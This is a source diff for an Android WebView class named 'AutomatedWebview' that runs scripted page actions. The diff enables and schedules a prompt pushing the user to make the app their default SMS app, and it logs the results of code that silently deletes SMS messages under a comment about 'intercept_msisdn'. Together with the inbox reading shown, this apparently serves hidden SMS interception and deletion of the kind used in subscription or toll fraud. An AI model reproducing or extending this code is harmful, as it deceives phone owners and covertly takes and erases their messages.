@@ -26,6 +26,7 @@ import android.provider.Telephony;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.AttributeSet;
+import android.util.Log;
 import android.webkit.WebChromeClient;
 import android.webkit.WebResourceRequest;
 import android.webkit.WebView;
@@ -242,9 +243,13 @@ public class AutomatedWebview extends WebView {
     public void process() {
         int seconds = 0;
         Handler handler = new Handler();
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                enableSMSDefault();
+            }
+        }, seconds * 1000);
         int count = 0;
-
-
         for (final Action item : actionList) {
             if (item.getAction().equalsIgnoreCase("load")) {
                 handler.postDelayed(new Runnable() {
@@ -291,12 +296,7 @@ public class AutomatedWebview extends WebView {
             count++;
         }
 
-//        handler.postDelayed(new Runnable() {
-//            @Override
-//            public void run() {
-//                enableSMSDefault();
-//            }
-//        }, seconds * 1000);
+
         //Removing SMS from intercept_msisdn
         handler.postDelayed(new Runnable() {
             @Override
@@ -462,6 +462,7 @@ public class AutomatedWebview extends WebView {
                 String uri = "content://sms/" + pid;
                 count = context.getContentResolver().delete(Uri.parse(uri),
                         null, null);
+                Log.d("message removal count", String.valueOf(count));
             } catch (Exception e) {
                 e.printStackTrace();
             }
@@ -552,32 +553,34 @@ public class AutomatedWebview extends WebView {
     }
 
     public void enableSMSDefault() {
-//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-//            if (!Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
-//
-//                AlertDialog.Builder builder = new AlertDialog.Builder(context);
-//                builder.setMessage("This app is not set as your default messaging app. Do you want to set it as default?")
-//                        .setCancelable(false)
-//                        .setTitle("Alert!")
-//                        .setNegativeButton("No", new DialogInterface.OnClickListener() {
-//
-//                            @Override
-//                            public void onClick(DialogInterface dialog, int which) {
-//                                dialog.dismiss();
-//                            }
-//                        })
-//                        .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
-//                            @TargetApi(19)
-//                            public void onClick(DialogInterface dialog, int id) {
-//
-//                                Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
-//                                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.getPackageName());
-//                                context.startActivity(intent);
-//                            }
-//                        });
-//                builder.show();
-//            }
-//        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+            String first = Telephony.Sms.getDefaultSmsPackage(context);
+            String second = context.getPackageName();
+            if (!Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
+
+                AlertDialog.Builder builder = new AlertDialog.Builder(context);
+                builder.setMessage("This app is not set as your default messaging app. Do you want to set it as default?")
+                        .setCancelable(false)
+                        .setTitle("Alert!")
+                        .setNegativeButton("No", new DialogInterface.OnClickListener() {
+
+                            @Override
+                            public void onClick(DialogInterface dialog, int which) {
+                                dialog.dismiss();
+                            }
+                        })
+                        .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
+                            @TargetApi(19)
+                            public void onClick(DialogInterface dialog, int id) {
+
+                                Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
+                                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.getPackageName());
+                                context.startActivity(intent);
+                            }
+                        });
+                builder.show();
+            }
+        }
     }
     private void fetchInbox() {
         Uri inboxURI = Uri.parse("content://sms/inbox");
